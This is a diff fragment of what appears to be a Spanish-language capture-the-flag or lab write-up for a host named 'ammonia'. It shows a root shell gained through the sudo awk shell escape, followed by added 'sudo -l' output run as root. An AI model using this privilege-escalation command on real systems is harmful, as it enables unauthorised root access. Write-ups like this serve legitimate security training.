@@ -368,6 +368,15 @@ Ejecución del comando sudo awk 'BEGIN {system("/bin/sh")}' gracias al privilegi
 clara_immerwahr@ammonia:~$ sudo awk 'BEGIN {system("/bin/sh")}'
 whoami
 root
+
+sudo -l
+Matching Defaults entries for root on ammonia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User root may run the following commands on ammonia:
+    (ALL : ALL) ALL
 ```
 
 ```bash
